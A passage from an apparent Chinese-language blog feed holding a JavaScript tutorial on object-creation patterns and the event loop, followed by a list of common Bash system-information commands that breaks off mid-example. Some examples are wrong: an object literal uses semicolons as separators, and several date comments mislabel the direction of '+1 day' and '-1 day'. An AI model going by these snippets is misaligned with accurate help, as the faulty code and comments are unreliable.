class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这行代码创建了<code>Object</code>引用类型的一个新实例，然后把实例保存在变量<code>Person</code>中。</p><h3 id="2-对象字面量方式"><a href="#2-对象字面量方式" class="headerlink" title="2. 对象字面量方式"></a>2. 对象字面量方式</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> Person <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Nike'</span><span class="token punctuation">;</span> <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">29</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>对象字面量是对象定义的一种简写形式，目的在于简化创建包含大量属性对象的过程。</p><blockquote><p><strong>注</strong>：前两种方法的缺点在于：它们都是用了同一个接口创建很多对象，会产生大量的重复代码，就是如果你有100个对象，那你要输入100次很多相同的代码。那我们有什么方法来避免过多的重复代码呢，就是把创建对象的过程封装在函数体内，通过函数的调用直接生成对象。</p></blockquote><h3 id="3-工厂模式"><a href="#3-工厂模式" class="headerlink" title="3. 工厂模式"></a>3. 工厂模式</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">createPerson</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> job</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    o<span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    o<span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    o<span class="token punctuation">.</span>job <span class="token operator">=</span> job<span class="token punctuation">;</span>    o<span class="token punctuation">.</span><span class="token function-variable function">sayName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> o<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token function">createPerson</span><span class="token punctuation">(</span><span class="token string">'Nike'</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token string">'teacher'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在使用工厂模式创建对象的时候，我们都可以注意到，在<code>createPerson</code>函数中，返回的是一个对象。但我们就无法判断返回的对象究竟是一个什么样的类型。于是就出现了第四种创建对象的模式。</p><h3 id="4-构造函数方式"><a href="#4-构造函数方式" class="headerlink" title="4. 构造函数方式"></a>4. 构造函数方式</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> job</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>job <span class="token operator">=</span> job<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">sayName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'Nike'</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token string">'teacher'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>person1 <span class="token keyword">instanceof</span> <span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ture</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对比工厂模式，我们可以发现以下区别：</p><ul><li>没有显示地创建对象</li><li>直接将属性和方法赋给了<code>this</code>对象</li><li>没有<code>return</code>语句</li><li>终于可以识别的对象的类型。对于检测对象类型，我们应该使用instanceof操作符，我们来进行自主检测：</li></ul><p>那么构造函数确实挺好用的，但是它也有它的缺点：就是每个方法都要在每个实例上重新创建一遍，方法指的就是我们在对象里面定义的函数。如果方法的数量很多，就会占用很多不必要的内存。于是出现了第五种创建对象的方法。</p><h3 id="5-原型创建对象模式"><a href="#5-原型创建对象模式" class="headerlink" title="5. 原型创建对象模式"></a>5. 原型创建对象模式</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Nike'</span><span class="token punctuation">;</span><span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>jbo <span class="token operator">=</span> <span class="token string">'teacher'</span><span class="token punctuation">;</span><span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">sayName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> person2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>person1<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Greg'</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>person1<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//'Greg' --来自实例</span><span class="token function">alert</span><span class="token punctuation">(</span>person2<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//'Nike' --来自原型</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当为对象实例添加一个属性时，这个属性就会屏蔽原型对象中保存的同名属性。</p><p>这时候我们就可以使用构造函数模式与原型模式结合的方式，构造函数模式用于定义实例属性，而原型模式用于定义方法和共享的属性。</p><h3 id="6-组合使用构造函数模式和原型模式"><a href="#6-组合使用构造函数模式和原型模式" class="headerlink" title="6. 组合使用构造函数模式和原型模式"></a>6. 组合使用构造函数模式和原型模式</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> job</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>job <span class="token operator">=</span> job<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Person</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">constructor</span><span class="token operator">:</span> Person<span class="token punctuation">,</span>    <span class="token function-variable function">sayName</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'Nike'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'teacher'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7-动态原型模式"><a href="#7-动态原型模式" class="headerlink" title="7. 动态原型模式"></a>7. 动态原型模式</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> job</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>job <span class="token operator">=</span> job<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">this</span><span class="token punctuation">.</span>sayName <span class="token operator">!=</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">sayName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'Nike'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'teacher'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>person1<span class="token punctuation">.</span><span class="token function">sayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>动态原型模式将所有信息封装在了构造函数中，而通过构造函数中初始化原型（仅第一个对象实例化时初始化原型），这个可以通过判断该方法是否有效而选择是否需要初始化原型。</p><h3 id="8-寄生构造函数方式"><a href="#8-寄生构造函数方式" class="headerlink" title="8. 寄生构造函数方式"></a>8. 寄生构造函数方式</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> job</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    o<span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    o<span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    o<span class="token punctuation">.</span>job <span class="token operator">=</span> job<span class="token punctuation">;</span>    o<span class="token punctuation">.</span><span class="token function-variable function">sayName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> o<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'Nike'</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token string">'teacher'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>寄生模式和工厂模式几乎一样，寄生模式和工厂模式的区别：</p><ul><li>寄生模式创建对象时使用了<code>new</code>关键字</li><li>寄生模式的外部包装函数是一个构造函数</li></ul><blockquote><p><strong>作用</strong>:寄生模式可以在特殊的情况下为对象来创建构造函数,原因在于我们可以通过构造函数重写对象的值，并通过return返回。重写调用构造函数(创建的对象的实例)之后的对象实例的新的值。</p></blockquote><h3 id="9-稳妥构造函数方式"><a href="#9-稳妥构造函数方式" class="headerlink" title="9. 稳妥构造函数方式"></a>9. 稳妥构造函数方式</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> job</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    o<span class="token punctuation">.</span><span class="token function-variable function">sayName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> o<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'Nike'</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token string">'teacher'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>person<span class="token punctuation">.</span><span class="token function">sayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 使用稳妥构造函数模式只能通过其构造函数内部的方法来获取里面的属性值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓稳妥对象，是指没有公共属性，而且其方法也不引用<code>this</code>对象。稳妥对象最适合在一些安全环境中（这些环境会禁止使用<code>this</code>和<code>new</code>），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：</p><ul><li>一是新创建对象的实例方法不引用<code>this</code>；</li><li>二是不使用<code>new</code>操作符调用构造函数。</li></ul><blockquote><p><strong>注</strong>：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。</p></blockquote><h2 id="并发模型和事件循环-event-loop"><a href="#并发模型和事件循环-event-loop" class="headerlink" title="并发模型和事件循环(event loop)"></a>并发模型和事件循环(event loop)</h2><p>JavaScript 的并发模型基于<strong>事件循环</strong>。</p><p><img src="https://statics.sh1a.qingstor.com/2020/11/27/js_event.png" alt="Js堆栈队列图"></p><h3 id="1-运行时概念"><a href="#1-运行时概念" class="headerlink" title="1. 运行时概念"></a>1. 运行时概念</h3><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>函数调用形成了一个栈帧。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token parameter">b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> a <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> y <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">foo</span><span class="token punctuation">(</span>x <span class="token operator">*</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当调用 bar 时，创建了第一个帧 ，帧中包含了 bar 的参数和局部变量。当 bar 调用 foo 时，第二个帧就被创建，并被压到第一个帧之上，帧中包含了 foo 的参数和局部变量。当 foo 返回时，最上层的帧就被弹出栈（剩下 bar 函数的调用帧 ）。当 bar 返回的时候，栈就空了。</p><h4 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h4><p>对象被分配在一个堆中，即用以表示一个大部分非结构化的内存区域。</p><h4 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h4><p>一个 JavaScript 运行时包含了一个待处理的消息队列。每一个消息都与一个函数相关联。当栈拥有足够内存时，从队列中取出一个消息进行处理。这个处理过程包含了调用与这个消息相关联的函数（以及因而创建了一个初始堆栈帧）。当栈再次为空的时候，也就意味着消息处理结束。</p><h3 id="2-事件循环"><a href="#2-事件循环" class="headerlink" title="2. 事件循环"></a>2. 事件循环</h3><p>之所以称为<strong>事件循环</strong>，是因为它经常被用于类似如下的方式来实现：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">while</span> <span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">waitForMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  queue<span class="token punctuation">.</span><span class="token function">processNextMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果当前没有任何消息，queue.waitForMessage 会等待着同步将要到来的消息。</p><p>每一个消息完整的执行后，其它消息才会被执行。这个模型的一个缺点在于当一个消息的完成耗时过长，网络应用无法处理用户的交互如点击或者滚动。浏览器用“程序需要过长时间运行”的对话框来缓解这个问题。一个比较好的解决方案是使消息处理变短且如果可能的话，将一个消息拆分成几个消息。</p><p>在浏览器里，当一个事件出现且有一个事件监听器被绑定时，消息会被随时添加。如果没有事件监听器，事件会丢失。所以点击一个附带点击事件处理函数的元素会添加一个消息。其它事件亦然。</p><h3 id="3-绝不阻塞"><a href="#3-绝不阻塞" class="headerlink" title="3. 绝不阻塞"></a>3. 绝不阻塞</h3><p>事件循环(event loop)模型特性在于它<strong>永不阻塞</strong>。通常由事件或者回调函数进行 I/O (input/output)处理 。</p><hr><p>参考文档：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript">MDN</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用Bash命令整理之其他常用命令</title>
      <link href="/2018/10/13/ruan-jian-gong-ju/chang-yong-bash-ming-ling-zheng-li-zhi-qi-ta-chang-yong-ming-ling/"/>
      <url>/2018/10/13/ruan-jian-gong-ju/chang-yong-bash-ming-ling-zheng-li-zhi-qi-ta-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h2 id="1-hostname-查看主机名"><a href="#1-hostname-查看主机名" class="headerlink" title="1. hostname - 查看主机名"></a>1. hostname - 查看主机名</h2><p><code>hostname</code>命令用于查看系统的主机名，或是修改系统的主机名。</p><p><code>hostname</code>的常用命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 显示系统的当前主机名</span><span class="token function">hostname</span><span class="token comment"># 修改你系统的主机名</span><span class="token function">hostname</span> blinkfox-system<span class="token comment"># 使用 -F 选项，从指定的文件中读取主机名</span><span class="token function">hostname</span> <span class="token parameter variable">-F</span> /root/hostname.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-uptime-查看系统运行时间"><a href="#2-uptime-查看系统运行时间" class="headerlink" title="2. uptime - 查看系统运行时间"></a>2. uptime - 查看系统运行时间</h2><p><code>uptime</code>命令用于打印系统的运行时间等信息。使用如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uptime</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-w、who-列出登录的用户"><a href="#3-w、who-列出登录的用户" class="headerlink" title="3. w、who - 列出登录的用户"></a>3. w、who - 列出登录的用户</h2><p><code>w</code>命令用于显示登录用户及他们当前运行的进程。输入的内容格式如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">w<span class="token comment"># 打印如下</span><span class="token number">22</span>:42  up <span class="token number">18</span> days, <span class="token number">1</span> hr, <span class="token number">2</span> users, load averages: <span class="token number">1.23</span> <span class="token number">1.79</span> <span class="token number">1.75</span><span class="token environment constant">USER</span>     TTY      FROM              LOGIN@  IDLE WHATblinkfox console  -                日19   6days -blinkfox s000     -                五23       - w<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>who</code>命令有与<code>w</code>命令类似的用途，但它的功能比<code>w</code>命令更强大一些。语法格式如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">who</span> <span class="token punctuation">[</span>OPTION<span class="token punctuation">]</span><span class="token punctuation">..</span>. <span class="token punctuation">[</span>FILE <span class="token operator">|</span> ARG1 ARG2<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>who</code>常用命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 显示当前登录的所有用户信息</span><span class="token function">who</span><span class="token comment"># 显示系统的启动时间</span><span class="token function">who</span> <span class="token parameter variable">-b</span><span class="token comment"># 显示系统登录进程</span><span class="token function">who</span> <span class="token parameter variable">-l</span><span class="token comment"># 显示与当前标准输入关联的用户信息</span><span class="token function">who</span> <span class="token parameter variable">-m</span><span class="token comment"># 显示系统的运行级别</span><span class="token function">who</span> <span class="token parameter variable">-r</span><span class="token comment"># 显示所有登录用户的用户名和登录用户数</span><span class="token function">who</span> <span class="token parameter variable">-q</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-uname-查看系统信息"><a href="#4-uname-查看系统信息" class="headerlink" title="4. uname - 查看系统信息"></a>4. uname - 查看系统信息</h2><p><code>uname</code>命令用于打印内核名称和版本、主机名等系统信息。命令的语法如下所示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token punctuation">[</span>OPTION<span class="token punctuation">]</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>常用使用方式如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 只打印内核的名称</span><span class="token function">uname</span><span class="token comment"># 使用 -n 选项，只打印系统的主机名</span><span class="token function">uname</span> <span class="token parameter variable">-n</span><span class="token comment"># 使用 -r 选项，打印内核版本信息</span><span class="token function">uname</span> <span class="token parameter variable">-r</span><span class="token comment"># 使用 -m 选项，打印系统的硬件名称</span><span class="token function">uname</span> <span class="token parameter variable">-m</span><span class="token comment"># 使用 -p 选项，打印系统的处理器类型信息</span><span class="token function">uname</span> <span class="token parameter variable">-p</span><span class="token comment"># 使用 -i 选项，打印系统的硬件平台信息</span><span class="token function">uname</span> <span class="token parameter variable">-i</span><span class="token comment"># 使用 -a 选项，打印上述所有示例中的信息</span><span class="token function">uname</span> <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-date-显示和设置系统日期和时间"><a href="#5-date-显示和设置系统日期和时间" class="headerlink" title="5. date - 显示和设置系统日期和时间"></a>5. date - 显示和设置系统日期和时间</h2><p><code>date</code>命令用于以多种格式显示日期和时间，或设置系统的日期和时间。<code>date</code>命令的语法如下所示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">date</span> <span class="token punctuation">[</span>OPTION<span class="token punctuation">]</span><span class="token punctuation">..</span>. <span class="token punctuation">[</span>+FORMAT<span class="token punctuation">]</span><span class="token function">date</span> <span class="token punctuation">[</span>-u<span class="token operator">|</span>--utc<span class="token operator">|</span>--universal<span class="token punctuation">]</span> <span class="token punctuation">[</span>MMDDhhmm<span class="token punctuation">[</span><span class="token punctuation">[</span>CC<span class="token punctuation">]</span>YY<span class="token punctuation">]</span><span class="token punctuation">[</span>.ss<span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>常用使用命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 以默认格式显示系统的当前日期时间</span><span class="token function">date</span><span class="token comment"># 格式化当前日期</span><span class="token function">date</span> +<span class="token string">"%Y-%m-%d"</span><span class="token comment"># 格式化输出昨天的日期</span><span class="token function">date</span> <span class="token parameter variable">-d</span> <span class="token string">"1 day ago"</span> +<span class="token string">"%Y-%m-%d"</span><span class="token comment"># 2秒后格式化输出</span><span class="token function">date</span> <span class="token parameter variable">-d</span> <span class="token string">"2 second"</span> +<span class="token string">"%Y-%m-%d %H:%M.%S"</span><span class="token comment"># 普通格式化转出</span><span class="token function">date</span> <span class="token parameter variable">-d</span> <span class="token string">"2009-12-12"</span> +<span class="token string">"%Y/%m/%d %H:%M.%S"</span><span class="token comment"># apache格式转换</span><span class="token function">date</span> <span class="token parameter variable">-d</span> <span class="token string">"Dec 5, 2009 12:00:37 AM"</span> +<span class="token string">"%Y-%m-%d %H:%M.%S"</span><span class="token comment"># 日期加减操作</span><span class="token function">date</span> +%Y%m%d <span class="token comment">#显示前天年月日</span><span class="token function">date</span> <span class="token parameter variable">-d</span> <span class="token string">"+1 day"</span> +%Y%m%d <span class="token comment">#显示前一天的日期</span><span class="token function">date</span> <span class="token parameter variable">-d</span> <span class="token string">"-1 day"</span> +%Y%m%d <span class="token comment">#显示后一天的日期</span><span class="token function">date</span> <span class="token parameter variable">-d</span> <span class="token string">"-1 month"</span> +%Y%m%d <span class="token comment">#显示上一月的日期</span><span class="token function">date</span> <span class="token parameter variable">-d</span> <span class="token string">"+1 month"</span> +%Y%m%d <span class="token comment">#显示下一月的日期</span><span class="token function">date</span> <span class="token parameter variable">-d</span> <span class="token string">"-1 year"</span> +%Y%m%d <span class="token comment">#显示前一年的日期</span><span class="token function">date</span> <span class="token parameter variable">-d</span> <span class="token string">"+1 year"</span> +%Y%m%d <span class="token comment">#显示下一年的日期</span><span class="token comment"># 设定时间</span><span class="token function">date</span> <span class="token parameter variable">-s</span> <span class="token comment"># 设置当前时间，只有root权限才能设置，其他只能查看</span><span class="token 